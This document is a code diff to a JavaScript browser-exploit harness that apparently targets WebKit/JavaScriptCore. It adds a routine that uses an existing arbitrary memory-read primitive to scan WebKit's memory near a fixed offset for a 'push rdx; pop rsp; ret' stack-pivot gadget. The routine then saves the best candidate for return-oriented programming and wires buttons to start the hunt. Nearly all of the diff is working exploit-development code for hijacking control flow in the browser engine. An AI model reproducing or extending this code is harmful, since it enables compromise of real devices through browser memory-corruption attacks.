@@ -21,7 +21,7 @@ import {
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828p";
+const BUILD_ID = "rw-20250828q";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -34,8 +34,12 @@ const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
 const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
 /** Bounded steps per auto-loop tick — yields + GC between chunks */
 const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
-/** G5 full low scan is opt-in (OOM risk) — default cluster-only */
+/** HW peek @ +0x2411b0 showed 48 ff c6… (not G5) — hunt rdx→rsp nearby */
+const G5_HUNT_CENTER = parseInt(params.get("g5center") || "2411b0", 16);
+const G5_HUNT_RADIUS = parseInt(params.get("g5rad") || "80000", 16);
+/** G5 full low scan is opt-in (OOM risk) */
 let scanG5Full = params.get("g5full") === "1";
+let g5Hunt = null;
 /** cal-style fast scan: read8 + 8-byte step, yield every 256 reads (like scanGadgetChunk) */
 const SCAN_YIELD_EVERY = parseInt(params.get("scanyield") || "256", 10);
 const SCAN_G5_CAND_MAX = 24;
@@ -568,6 +572,108 @@ function restoreHwPivot() {
     else setUi();
 }
 
+function pickBestG5Cand(cands, center) {
+    if (!cands.length) return null;
+    const rdx = cands.filter(c => /rdx/i.test(c.kind));
+    const pool = rdx.length ? rdx : cands;
+    pool.sort((a, b) => Math.abs(a.rva - center) - Math.abs(b.rva - center));
+    return pool[0];
+}
+
+function scanG5PatternsAt(p, webkitBase, rva, cands, center) {
+    const w = read8p(p, webkitBase.add32(rva));
+    if (!w) return;
+    const bytes = bytesFromRead8(w);
+    for (let pi = 0; pi < G5_PATTERNS.length; pi++) {
+        const offIn = findPatInQword(bytes, G5_PATTERNS[pi].pat);
+        if (offIn >= 0)
+            g5CandPush(cands, { rva: rva + offIn, kind: G5_PATTERNS[pi].kind }, center);
+    }
+    for (let start = 0; start <= 4; start++) {
+        if (bytes[start + 1] === 0x52 && bytes[start + 2] === 0x5c && bytes[start + 3] === 0xc3
+            && bytes[start] >= 0x40 && bytes[start] <= 0x4f) {
+            g5CandPush(cands, {
+                rva: rva + start,
+                kind: "rex push rdx; pop rsp; ret",
+            }, center);
+        }
+    }
+}
+
+async function g5HuntChunk(p, webkitBase) {
+    if (!g5Hunt) return true;
+    let rva = g5Hunt.cursor != null ? g5Hunt.cursor : (g5Hunt.minRva & ~7);
+    let steps = 0;
+    while (rva < g5Hunt.maxRva && steps < SCAN_CHUNK_STEPS) {
+        scanG5PatternsAt(p, webkitBase, rva, g5Hunt.cands, g5Hunt.center);
+        rva += 8;
+        steps++;
+        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
+            await new Promise(r => setTimeout(r, 0));
+    }
+    g5Hunt.cursor = rva;
+    scanState("G5 hunt @+0x" + rva.toString(16) + " hits=" + g5Hunt.cands.length);
+    return rva >= g5Hunt.maxRva;
+}
+
+async function runG5HuntNear() {
+    if (!ready || !window.p || busy) return;
+    if (g5Hunt && !g5Hunt.done) {
+        g5Hunt = null;
+        mark("G5-STOP", "hunt cancelled");
+        busy = false;
+        setUi();
+        return;
+    }
+    const p = window.p;
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    if (!webkitBase) {
+        mark("G5-SKIP", "no webkitBase — Save bases first");
+        return;
+    }
+    g5Hunt = {
+        center: G5_HUNT_CENTER,
+        minRva: Math.max(SCAN_PIVOT_MIN, G5_HUNT_CENTER - G5_HUNT_RADIUS),
+        maxRva: Math.min(SCAN_LOW_MAX, G5_HUNT_CENTER + G5_HUNT_RADIUS),
+        cursor: null,
+        cands: [],
+        done: false,
+    };
+    busy = true;
+    scanQuiet = true;
+    setUi();
+    mark("G5-HUNT", "+0x" + g5Hunt.minRva.toString(16) + "…+0x" + g5Hunt.maxRva.toString(16)
+        + " (center +0x" + G5_HUNT_CENTER.toString(16) + " — NOT 48 ff c6 code)");
+    let huntBest = null;
+    try {
+        let finished = false;
+        while (!finished) {
+            finished = await g5HuntChunk(p, webkitBase);
+        }
+        g5Hunt.done = true;
+        if (!g5Hunt.cands.length) {
+            mark("G5-HUNT-MISS", "no rdx→rsp pivot ±0x" + G5_HUNT_RADIUS.toString(16)
+                + " around +0x" + G5_HUNT_CENTER.toString(16));
+            mark("G5-HINT", "tap G5 full scan — 2411b0 is inc rsi, not a gadget");
+        } else {
+            logG5Cands(g5Hunt.cands);
+            const best = pickBestG5Cand(g5Hunt.cands, G5_HUNT_CENTER);
+            if (best) {
+                mark("G5-HUNT-BEST", "+0x" + best.rva.toString(16) + " " + best.kind);
+                saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: best.rva });
+                huntBest = best.rva;
+            }
+        }
+    } finally {
+        scanQuiet = false;
+        g5Hunt = null;
+        busy = false;
+        renderOut();
+        setUi();
+        if (huntBest != null) verifyPivotManual();
+    }
+}
+
 function peekG5Rva(rva) {
     if (!ready || !window.p) {
         mark("G5-SKIP", "need Start + Save bases first");
@@ -587,34 +693,21 @@ function wireG5Bar() {
     const host = $("gadget-g5");
     if (!host) return;
     const g0 = PIVOT_HW_1352.wk_MOV_RDI_RSI_30_CALL;
-    const predicted = g5DerivedHint(PIVOT_HW_1352);
-    const cands = predicted > 0
-        ? [predicted, predicted - 3, predicted + 4]
-        : [0x2411ac, 0x2411a9, 0x2411b0];
-    const seen = new Set();
-    const uniq = [];
-    for (let i = 0; i < cands.length; i++) {
-        if (seen.has(cands[i])) continue;
-        seen.add(cands[i]);
-        uniq.push(cands[i]);
-    }
 
-    function addBtn(label, fn) {
+    function addBtn(label, fn, alwaysOn) {
         const b = document.createElement("button");
         b.type = "button";
         b.className = "secondary";
         b.textContent = label;
-        b.disabled = true;
+        b.disabled = !alwaysOn;
         wireClick(b, fn);
         host.appendChild(b);
-        g5BarBtns.push(b);
+        if (!alwaysOn) g5BarBtns.push(b);
+        return b;
     }
 
-    for (let i = 0; i < uniq.length; i++) {
-        const rva = uniq[i];
-        addBtn("G5 +0x" + rva.toString(16), function () { applyG5Rva(rva); });
-    }
-    addBtn("peek +0x" + uniq[0].toString(16), function () { peekG5Rva(uniq[0]); });
+    addBtn("G5 hunt ±512K", function () { runG5HuntNear(); });
+    addBtn("peek +0x2411b0", function () { peekG5Rva(G5_HUNT_CENTER); });
     addBtn("G5 probe", function () { runG5ClusterProbe(); });
     addBtn("G5 full scan", function () {
         scanG5Full = true;
@@ -641,10 +734,8 @@ function wireG5Bar() {
     clearHost.appendChild(restoreBtn);
 
     const hint = host.querySelector(".bar-label");
-    if (hint && g0 != null) {
-        hint.textContent = "G5 candidates (G0 +0x" + g0.toString(16)
-            + " + 0x" + G5_DELTA_FROM_G0.toString(16)
-            + ") — tap to set + verify";
+    if (hint) {
+        hint.textContent = "+0x2411b0 = inc rsi (NOT G5) — hunt scans ±512K for 52 5c c3 / mov rsp,rdx";
     }
 }
 
@@ -845,11 +936,11 @@ function pivotClusterRange(found) {
 
 function pivotScanRange(key, phase, found) {
     if (phase === "nearg5") {
-        const hint = pivotScanHint(key, found, SCAN_LOW_MAX);
-        if (hint <= 0 || hint >= SCAN_LOW_MAX) return null;
+        const center = G5_HUNT_CENTER || pivotScanHint(key, found, SCAN_LOW_MAX);
+        if (center <= 0 || center >= SCAN_LOW_MAX) return null;
         return {
-            minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
-            maxRva: Math.min(SCAN_LOW_MAX, hint + SCAN_NEAR_RADIUS),
+            minRva: Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
+            maxRva: Math.min(SCAN_LOW_MAX, center + G5_HUNT_RADIUS),
         };
     }
     if (phase === "cluster") {
